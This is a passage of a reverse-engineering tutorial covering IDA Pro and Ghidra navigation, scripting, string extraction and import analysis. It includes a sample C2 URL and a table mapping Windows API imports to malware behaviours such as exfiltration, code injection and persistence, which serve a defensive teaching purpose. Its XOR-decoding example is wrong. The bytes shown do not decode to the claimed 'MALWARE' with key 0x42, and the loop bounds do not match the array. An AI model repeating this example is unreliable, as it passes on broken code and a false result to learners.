<div class="language-text codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_QJqH"><pre tabindex="0" class="prism-code language-text codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">Address   String</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">00402000  &quot;Password: &quot;</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">00402010  &quot;Access granted!&quot;</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">00402020  &quot;Access denied!&quot;</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">00402030  &quot;https://malicious-c2.com/api&quot;</span><br></span></code></pre></div></div>
<p><strong>4. Imports/Exports (View → Open subviews → Imports):</strong></p>
<div class="language-text codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_QJqH"><pre tabindex="0" class="prism-code language-text codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">Address   Library      Function</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">00401000  kernel32.dll CreateFileA</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">00401008  kernel32.dll WriteFile</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">00401010  ws2_32.dll   WSAStartup</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">00401018  ws2_32.dll   connect</span><br></span></code></pre></div></div>
<p><strong>5. Cross-references (Xrefs):</strong></p>
<div class="language-text codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_QJqH"><pre tabindex="0" class="prism-code language-text codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">; Right-click on function/data → &quot;Jump to xref to operand&quot;</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">; Shows all locations that call this function or reference this data</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">.text:00401000 CreateFileA:</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    .text:00401050  call CreateFileA  ; First xref</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    .text:00401100  call CreateFileA  ; Second xref</span><br></span></code></pre></div></div>
<p><strong>IDA Pro shortcuts:</strong></p>
<table><thead><tr><th>Key</th><th>Action</th></tr></thead><tbody><tr><td><strong>Space</strong></td><td>Toggle graph view / text view</td></tr><tr><td><strong>F5</strong></td><td>Decompile function (Hex-Rays)</td></tr><tr><td><strong>N</strong></td><td>Rename symbol</td></tr><tr><td><strong>X</strong></td><td>Show cross-references (xrefs)</td></tr><tr><td><strong>G</strong></td><td>Jump to address</td></tr><tr><td><strong>Esc</strong></td><td>Go back</td></tr><tr><td><strong>;</strong></td><td>Add comment</td></tr><tr><td><strong>:</strong></td><td>Add repeatable comment</td></tr><tr><td><strong>Y</strong></td><td>Change function prototype</td></tr><tr><td><strong>D</strong></td><td>Convert to data</td></tr><tr><td><strong>C</strong></td><td>Convert to code</td></tr><tr><td><strong>U</strong></td><td>Undefine</td></tr></tbody></table>
<p><strong>IDAPython scripting:</strong></p>
<div class="language-python codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_QJqH"><pre tabindex="0" class="prism-code language-python codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token comment" style="color:#999988;font-style:italic"># IDAPython: Rename all functions starting with &quot;sub_&quot;</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token keyword" style="color:#00009f">import</span><span class="token plain"> idc</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token keyword" style="color:#00009f">import</span><span class="token plain"> idaapi</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token keyword" style="color:#00009f">for</span><span class="token plain"> func_ea </span><span class="token keyword" style="color:#00009f">in</span><span class="token plain"> Functions</span><span class="token punctuation" style="color:#393A34">(</span><span class="token punctuation" style="color:#393A34">)</span><span class="token punctuation" style="color:#393A34">:</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    func_name </span><span class="token operator" style="color:#393A34">=</span><span class="token plain"> idc</span><span class="token punctuation" style="color:#393A34">.</span><span class="token plain">get_func_name</span><span class="token punctuation" style="color:#393A34">(</span><span class="token plain">func_ea</span><span class="token punctuation" style="color:#393A34">)</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    </span><span class="token keyword" style="color:#00009f">if</span><span class="token plain"> func_name</span><span class="token punctuation" style="color:#393A34">.</span><span class="token plain">startswith</span><span class="token punctuation" style="color:#393A34">(</span><span class="token string" style="color:#e3116c">&quot;sub_&quot;</span><span class="token punctuation" style="color:#393A34">)</span><span class="token punctuation" style="color:#393A34">:</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">        </span><span class="token comment" style="color:#999988;font-style:italic"># Rename based on strings or behavior</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">        new_name </span><span class="token operator" style="color:#393A34">=</span><span class="token plain"> </span><span class="token string" style="color:#e3116c">&quot;analyze_me_&quot;</span><span class="token plain"> </span><span class="token operator" style="color:#393A34">+</span><span class="token plain"> func_name</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">        idc</span><span class="token punctuation" style="color:#393A34">.</span><span class="token plain">set_name</span><span class="token punctuation" style="color:#393A34">(</span><span class="token plain">func_ea</span><span class="token punctuation" style="color:#393A34">,</span><span class="token plain"> new_name</span><span class="token punctuation" style="color:#393A34">,</span><span class="token plain"> idc</span><span class="token punctuation" style="color:#393A34">.</span><span class="token plain">SN_CHECK</span><span class="token punctuation" style="color:#393A34">)</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">        </span><span class="token keyword" style="color:#00009f">print</span><span class="token punctuation" style="color:#393A34">(</span><span class="token string-interpolation string" style="color:#e3116c">f&quot;Renamed </span><span class="token string-interpolation interpolation punctuation" style="color:#393A34">{</span><span class="token string-interpolation interpolation">func_name</span><span class="token string-interpolation interpolation punctuation" style="color:#393A34">}</span><span class="token string-interpolation string" style="color:#e3116c"> to </span><span class="token string-interpolation interpolation punctuation" style="color:#393A34">{</span><span class="token string-interpolation interpolation">new_name</span><span class="token string-interpolation interpolation punctuation" style="color:#393A34">}</span><span class="token string-interpolation string" style="color:#e3116c">&quot;</span><span class="token punctuation" style="color:#393A34">)</span><br></span></code></pre></div></div>
<h3 class="anchor anchorTargetStickyNavbar_Vzrq" id="ghidra-basics">Ghidra Basics<a href="#ghidra-basics" class="hash-link" aria-label="Direct link to Ghidra Basics" title="Direct link to Ghidra Basics" translate="no">​</a></h3>
<p><strong>Launching Ghidra:</strong></p>
<div class="language-bash codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_QJqH"><pre tabindex="0" class="prism-code language-bash codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token comment" style="color:#999988;font-style:italic"># Linux/macOS:</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">./ghidraRun</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token comment" style="color:#999988;font-style:italic"># Windows:</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">ghidraRun.bat</span><br></span></code></pre></div></div>
<p><strong>Creating a project and importing binary:</strong></p>
<ol>
<li class=""><strong>File → New Project</strong> → Non-Shared Project</li>
<li class=""><strong>File → Import File</strong> → Select binary</li>
<li class="">Analyze with default options (click &quot;Yes&quot; when prompted)</li>
</ol>
<p><strong>Ghidra interface:</strong></p>
<p><strong>1. CodeBrowser (main window):</strong></p>
<ul>
<li class=""><strong>Listing:</strong> Disassembly view (assembly code)</li>
<li class=""><strong>Decompiler:</strong> Decompiled C-like code (click on function)</li>
<li class=""><strong>Function Graph:</strong> Control flow graph</li>
</ul>
<p><strong>2. Decompiler view:</strong></p>
<div class="language-c codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_QJqH"><pre tabindex="0" class="prism-code language-c codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token keyword" style="color:#00009f">void</span><span class="token plain"> </span><span class="token function" style="color:#d73a49">main</span><span class="token punctuation" style="color:#393A34">(</span><span class="token keyword" style="color:#00009f">void</span><span class="token punctuation" style="color:#393A34">)</span><span class="token plain"> </span><span class="token punctuation" style="color:#393A34">{</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">  </span><span class="token keyword" style="color:#00009f">int</span><span class="token plain"> counter </span><span class="token operator" style="color:#393A34">=</span><span class="token plain"> </span><span class="token number" style="color:#36acaa">0</span><span class="token punctuation" style="color:#393A34">;</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">  </span><span class="token keyword" style="color:#00009f">while</span><span class="token plain"> </span><span class="token punctuation" style="color:#393A34">(</span><span class="token plain">counter </span><span class="token operator" style="color:#393A34">&lt;</span><span class="token plain"> </span><span class="token number" style="color:#36acaa">10</span><span class="token punctuation" style="color:#393A34">)</span><span class="token plain"> </span><span class="token punctuation" style="color:#393A34">{</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    </span><span class="token function" style="color:#d73a49">printf</span><span class="token punctuation" style="color:#393A34">(</span><span class="token string" style="color:#e3116c">&quot;Counter: %d\n&quot;</span><span class="token punctuation" style="color:#393A34">,</span><span class="token plain"> counter</span><span class="token punctuation" style="color:#393A34">)</span><span class="token punctuation" style="color:#393A34">;</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    counter </span><span class="token operator" style="color:#393A34">=</span><span class="token plain"> counter </span><span class="token operator" style="color:#393A34">+</span><span class="token plain"> </span><span class="token number" style="color:#36acaa">1</span><span class="token punctuation" style="color:#393A34">;</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">  </span><span class="token punctuation" style="color:#393A34">}</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">  </span><span class="token keyword" style="color:#00009f">return</span><span class="token punctuation" style="color:#393A34">;</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token punctuation" style="color:#393A34">}</span><br></span></code></pre></div></div>
<p><strong>3. Symbol Tree:</strong></p>
<ul>
<li class="">Functions, imports, exports, strings</li>
<li class="">Right-click → &quot;References to&quot; (find xrefs)</li>
</ul>
<p><strong>Ghidra shortcuts:</strong></p>
<table><thead><tr><th>Key</th><th>Action</th></tr></thead><tbody><tr><td><strong>L</strong></td><td>Rename variable/function</td></tr><tr><td><strong>;</strong></td><td>Add comment (EOL comment)</td></tr><tr><td><strong>Ctrl+Shift+G</strong></td><td>Goto address</td></tr><tr><td><strong>Ctrl+Shift+E</strong></td><td>Edit function signature</td></tr><tr><td><strong>G</strong></td><td>Goto (jump to reference)</td></tr><tr><td><strong>Ctrl+/</strong></td><td>Add/remove bookmark</td></tr></tbody></table>
<p><strong>Ghidra scripting (Python):</strong></p>
<div class="language-python codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_QJqH"><pre tabindex="0" class="prism-code language-python codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token comment" style="color:#999988;font-style:italic"># Ghidra Python: Find all calls to &quot;strcpy&quot; (dangerous function)</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token keyword" style="color:#00009f">from</span><span class="token plain"> ghidra</span><span class="token punctuation" style="color:#393A34">.</span><span class="token plain">program</span><span class="token punctuation" style="color:#393A34">.</span><span class="token plain">model</span><span class="token punctuation" style="color:#393A34">.</span><span class="token plain">symbol </span><span class="token keyword" style="color:#00009f">import</span><span class="token plain"> RefType</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">strcpy_func </span><span class="token operator" style="color:#393A34">=</span><span class="token plain"> getFunction</span><span class="token punctuation" style="color:#393A34">(</span><span class="token string" style="color:#e3116c">&quot;strcpy&quot;</span><span class="token punctuation" style="color:#393A34">)</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token keyword" style="color:#00009f">if</span><span class="token plain"> strcpy_func</span><span class="token punctuation" style="color:#393A34">:</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    refs </span><span class="token operator" style="color:#393A34">=</span><span class="token plain"> getReferencesTo</span><span class="token punctuation" style="color:#393A34">(</span><span class="token plain">strcpy_func</span><span class="token punctuation" style="color:#393A34">.</span><span class="token plain">getEntryPoint</span><span class="token punctuation" style="color:#393A34">(</span><span class="token punctuation" style="color:#393A34">)</span><span class="token punctuation" style="color:#393A34">)</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    </span><span class="token keyword" style="color:#00009f">for</span><span class="token plain"> ref </span><span class="token keyword" style="color:#00009f">in</span><span class="token plain"> refs</span><span class="token punctuation" style="color:#393A34">:</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">        </span><span class="token keyword" style="color:#00009f">if</span><span class="token plain"> ref</span><span class="token punctuation" style="color:#393A34">.</span><span class="token plain">getReferenceType</span><span class="token punctuation" style="color:#393A34">(</span><span class="token punctuation" style="color:#393A34">)</span><span class="token plain"> </span><span class="token operator" style="color:#393A34">==</span><span class="token plain"> RefType</span><span class="token punctuation" style="color:#393A34">.</span><span class="token plain">UNCONDITIONAL_CALL</span><span class="token punctuation" style="color:#393A34">:</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">            caller </span><span class="token operator" style="color:#393A34">=</span><span class="token plain"> getFunctionContaining</span><span class="token punctuation" style="color:#393A34">(</span><span class="token plain">ref</span><span class="token punctuation" style="color:#393A34">.</span><span class="token plain">getFromAddress</span><span class="token punctuation" style="color:#393A34">(</span><span class="token punctuation" style="color:#393A34">)</span><span class="token punctuation" style="color:#393A34">)</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">            </span><span class="token keyword" style="color:#00009f">print</span><span class="token punctuation" style="color:#393A34">(</span><span class="token string-interpolation string" style="color:#e3116c">f&quot;strcpy called from: </span><span class="token string-interpolation interpolation punctuation" style="color:#393A34">{</span><span class="token string-interpolation interpolation">caller</span><span class="token string-interpolation interpolation punctuation" style="color:#393A34">.</span><span class="token string-interpolation interpolation">getName</span><span class="token string-interpolation interpolation punctuation" style="color:#393A34">(</span><span class="token string-interpolation interpolation punctuation" style="color:#393A34">)</span><span class="token string-interpolation interpolation punctuation" style="color:#393A34">}</span><span class="token string-interpolation string" style="color:#e3116c"> at </span><span class="token string-interpolation interpolation punctuation" style="color:#393A34">{</span><span class="token string-interpolation interpolation">ref</span><span class="token string-interpolation interpolation punctuation" style="color:#393A34">.</span><span class="token string-interpolation interpolation">getFromAddress</span><span class="token string-interpolation interpolation punctuation" style="color:#393A34">(</span><span class="token string-interpolation interpolation punctuation" style="color:#393A34">)</span><span class="token string-interpolation interpolation punctuation" style="color:#393A34">}</span><span class="token string-interpolation string" style="color:#e3116c">&quot;</span><span class="token punctuation" style="color:#393A34">)</span><br></span></code></pre></div></div>
<h3 class="anchor anchorTargetStickyNavbar_Vzrq" id="string-analysis">String Analysis<a href="#string-analysis" class="hash-link" aria-label="Direct link to String Analysis" title="Direct link to String Analysis" translate="no">​</a></h3>
<p><strong>Why strings matter:</strong></p>
<ul>
<li class="">Reveal functionality (API endpoints, file paths, error messages)</li>
<li class="">Provide clues for password/license checks</li>
<li class="">Indicate malware C2 servers or exfiltration targets</li>
</ul>
<p><strong>Extracting strings:</strong></p>
<div class="language-bash codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_QJqH"><pre tabindex="0" class="prism-code language-bash codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token comment" style="color:#999988;font-style:italic"># Linux: strings command</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">strings malware.bin </span><span class="token operator" style="color:#393A34">|</span><span class="token plain"> </span><span class="token function" style="color:#d73a49">grep</span><span class="token plain"> </span><span class="token parameter variable" style="color:#36acaa">-i</span><span class="token plain"> </span><span class="token string" style="color:#e3116c">&quot;password&quot;</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">strings </span><span class="token parameter variable" style="color:#36acaa">-e</span><span class="token plain"> l malware.bin  </span><span class="token comment" style="color:#999988;font-style:italic"># Unicode (little-endian) strings</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token comment" style="color:#999988;font-style:italic"># Windows: Sysinternals strings.exe</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">strings64.exe malware.exe </span><span class="token operator" style="color:#393A34">|</span><span class="token plain"> findstr /i </span><span class="token string" style="color:#e3116c">&quot;http&quot;</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token comment" style="color:#999988;font-style:italic"># IDA Pro: Shift+F12 (Strings window)</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token comment" style="color:#999988;font-style:italic"># Ghidra: Window → Defined Strings</span><br></span></code></pre></div></div>
<p><strong>Obfuscated strings:</strong></p>
<p>Malware often hides strings via encoding/encryption:</p>
<div class="language-c codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_QJqH"><pre tabindex="0" class="prism-code language-c codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token comment" style="color:#999988;font-style:italic">// Example: XOR-encoded string</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token keyword" style="color:#00009f">char</span><span class="token plain"> encoded</span><span class="token punctuation" style="color:#393A34">[</span><span class="token punctuation" style="color:#393A34">]</span><span class="token plain"> </span><span class="token operator" style="color:#393A34">=</span><span class="token plain"> </span><span class="token punctuation" style="color:#393A34">{</span><span class="token number" style="color:#36acaa">0x1F</span><span class="token punctuation" style="color:#393A34">,</span><span class="token plain"> </span><span class="token number" style="color:#36acaa">0x0E</span><span class="token punctuation" style="color:#393A34">,</span><span class="token plain"> </span><span class="token number" style="color:#36acaa">0x0C</span><span class="token punctuation" style="color:#393A34">,</span><span class="token plain"> </span><span class="token number" style="color:#36acaa">0x0C</span><span class="token punctuation" style="color:#393A34">,</span><span class="token plain"> </span><span class="token number" style="color:#36acaa">0x18</span><span class="token punctuation" style="color:#393A34">,</span><span class="token plain"> </span><span class="token number" style="color:#36acaa">0x05</span><span class="token punctuation" style="color:#393A34">,</span><span class="token plain"> </span><span class="token number" style="color:#36acaa">0x3B</span><span class="token punctuation" style="color:#393A34">,</span><span class="token plain"> </span><span class="token number" style="color:#36acaa">0x00</span><span class="token punctuation" style="color:#393A34">}</span><span class="token punctuation" style="color:#393A34">;</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token keyword" style="color:#00009f">char</span><span class="token plain"> decoded</span><span class="token punctuation" style="color:#393A34">[</span><span class="token number" style="color:#36acaa">9</span><span class="token punctuation" style="color:#393A34">]</span><span class="token punctuation" style="color:#393A34">;</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token keyword" style="color:#00009f">for</span><span class="token plain"> </span><span class="token punctuation" style="color:#393A34">(</span><span class="token keyword" style="color:#00009f">int</span><span class="token plain"> i </span><span class="token operator" style="color:#393A34">=</span><span class="token plain"> </span><span class="token number" style="color:#36acaa">0</span><span class="token punctuation" style="color:#393A34">;</span><span class="token plain"> i </span><span class="token operator" style="color:#393A34">&lt;</span><span class="token plain"> </span><span class="token number" style="color:#36acaa">8</span><span class="token punctuation" style="color:#393A34">;</span><span class="token plain"> i</span><span class="token operator" style="color:#393A34">++</span><span class="token punctuation" style="color:#393A34">)</span><span class="token plain"> </span><span class="token punctuation" style="color:#393A34">{</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    decoded</span><span class="token punctuation" style="color:#393A34">[</span><span class="token plain">i</span><span class="token punctuation" style="color:#393A34">]</span><span class="token plain"> </span><span class="token operator" style="color:#393A34">=</span><span class="token plain"> encoded</span><span class="token punctuation" style="color:#393A34">[</span><span class="token plain">i</span><span class="token punctuation" style="color:#393A34">]</span><span class="token plain"> </span><span class="token operator" style="color:#393A34">^</span><span class="token plain"> </span><span class="token number" style="color:#36acaa">0x42</span><span class="token punctuation" style="color:#393A34">;</span><span class="token plain">  </span><span class="token comment" style="color:#999988;font-style:italic">// XOR with key 0x42</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token punctuation" style="color:#393A34">}</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">decoded</span><span class="token punctuation" style="color:#393A34">[</span><span class="token number" style="color:#36acaa">8</span><span class="token punctuation" style="color:#393A34">]</span><span class="token plain"> </span><span class="token operator" style="color:#393A34">=</span><span class="token plain"> </span><span class="token char">&#x27;\0&#x27;</span><span class="token punctuation" style="color:#393A34">;</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token comment" style="color:#999988;font-style:italic">// Result: &quot;MALWARE&quot;</span><br></span></code></pre></div></div>
<p><strong>Decoding in IDA/Ghidra:</strong></p>
<ul>
<li class="">Identify decoding loop in disassembly</li>
<li class="">Extract encoded data and XOR key</li>
<li class="">Write script to decode:</li>
</ul>
<div class="language-python codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_QJqH"><pre tabindex="0" class="prism-code language-python codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token comment" style="color:#999988;font-style:italic"># IDAPython: Decode XOR-encoded string</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">encoded </span><span class="token operator" style="color:#393A34">=</span><span class="token plain"> </span><span class="token punctuation" style="color:#393A34">[</span><span class="token number" style="color:#36acaa">0x1F</span><span class="token punctuation" style="color:#393A34">,</span><span class="token plain"> </span><span class="token number" style="color:#36acaa">0x0E</span><span class="token punctuation" style="color:#393A34">,</span><span class="token plain"> </span><span class="token number" style="color:#36acaa">0x0C</span><span class="token punctuation" style="color:#393A34">,</span><span class="token plain"> </span><span class="token number" style="color:#36acaa">0x0C</span><span class="token punctuation" style="color:#393A34">,</span><span class="token plain"> </span><span class="token number" style="color:#36acaa">0x18</span><span class="token punctuation" style="color:#393A34">,</span><span class="token plain"> </span><span class="token number" style="color:#36acaa">0x05</span><span class="token punctuation" style="color:#393A34">,</span><span class="token plain"> </span><span class="token number" style="color:#36acaa">0x3B</span><span class="token punctuation" style="color:#393A34">]</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">key </span><span class="token operator" style="color:#393A34">=</span><span class="token plain"> </span><span class="token number" style="color:#36acaa">0x42</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">decoded </span><span class="token operator" style="color:#393A34">=</span><span class="token plain"> </span><span class="token string" style="color:#e3116c">&#x27;&#x27;</span><span class="token punctuation" style="color:#393A34">.</span><span class="token plain">join</span><span class="token punctuation" style="color:#393A34">(</span><span class="token builtin">chr</span><span class="token punctuation" style="color:#393A34">(</span><span class="token plain">b </span><span class="token operator" style="color:#393A34">^</span><span class="token plain"> key</span><span class="token punctuation" style="color:#393A34">)</span><span class="token plain"> </span><span class="token keyword" style="color:#00009f">for</span><span class="token plain"> b </span><span class="token keyword" style="color:#00009f">in</span><span class="token plain"> encoded</span><span class="token punctuation" style="color:#393A34">)</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token keyword" style="color:#00009f">print</span><span class="token punctuation" style="color:#393A34">(</span><span class="token string-interpolation string" style="color:#e3116c">f&quot;Decoded: </span><span class="token string-interpolation interpolation punctuation" style="color:#393A34">{</span><span class="token string-interpolation interpolation">decoded</span><span class="token string-interpolation interpolation punctuation" style="color:#393A34">}</span><span class="token string-interpolation string" style="color:#e3116c">&quot;</span><span class="token punctuation" style="color:#393A34">)</span><br></span></code></pre></div></div>
<h3 class="anchor anchorTargetStickyNavbar_Vzrq" id="importexport-analysis">Import/Export Analysis<a href="#importexport-analysis" class="hash-link" aria-label="Direct link to Import/Export Analysis" title="Direct link to Import/Export Analysis" translate="no">​</a></h3>
<p><strong>Imports</strong> reveal which external functions the binary uses (Windows API, libc, etc.).</p>
<p><strong>Windows PE imports:</strong></p>
<div class="language-text codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_QJqH"><pre tabindex="0" class="prism-code language-text codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">kernel32.dll:</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">  - CreateFileA       (file operations)</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">  - WriteFile         (write to file)</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">  - CreateProcessA    (spawn process)</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">ws2_32.dll:</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">  - WSAStartup        (network initialization)</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">  - socket            (create socket)</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">  - connect           (connect to remote host)</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">user32.dll:</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">  - MessageBoxA       (display message)</span><br></span></code></pre></div></div>
<p><strong>Suspicious import patterns:</strong></p>
<table><thead><tr><th>Imports</th><th>Likely Functionality</th></tr></thead><tbody><tr><td><code>CreateFileA</code>, <code>WriteFile</code>, <code>ReadFile</code></td><td>File operations (ransomware, data theft)</td></tr><tr><td><code>WSAStartup</code>, <code>socket</code>, <code>connect</code></td><td>Network communication (C2, data exfiltration)</td></tr><tr><td><code>CreateProcessA</code>, <code>ShellExecuteA</code></td><td>Process execution (dropper, backdoor)</td></tr><tr><td><code>VirtualAlloc</code>, <code>WriteProcessMemory</code></td><td>Code injection (process hollowing)</td></tr><tr><td><code>RegOpenKeyExA</code>, <code>RegSetValueExA</code></td><td>Registry modification (persistence)</td></tr><tr><td><code>CryptEncrypt</code>, <code>CryptDecrypt</code></td><td>Encryption (ransomware, data protection)</td></tr></tbody></table>
<p><strong>Analyzing imports in IDA:</strong></p>
<ol>
<li class=""><strong>View → Open subviews → Imports</strong></li>
<li class="">Double-click on import to see where it&#x27;s called (xrefs)</li>
</ol>
<p><strong>Analyzing imports in Ghidra:</strong></p>
<ol>
<li class=""><strong>Symbol Tree → Imports</strong></li>
<li class="">Right-click → <strong>References to</strong> (show xrefs)</li>
</ol>
<hr>
<h2 class="anchor anchorTargetStickyNavbar_Vzrq" id="dynamic-analysis">Dynamic Analysis<a href="#dynamic-analysis" class="hash-link" aria-label="Direct link to Dynamic Analysis" title="Direct link to Dynamic Analysis" translate="no">​</a></h2>
<h3 class="anchor anchorTargetStickyNavbar_Vzrq" id="debuggers">Debuggers<a href="#debuggers" class="hash-link" aria-label="Direct link to Debuggers" title="Direct link to Debuggers" translate="no">​</a></h3>
<p><strong>Dynamic analysis</strong> examines the binary during execution.</p>
<p><strong>Popular debuggers:</strong></p>
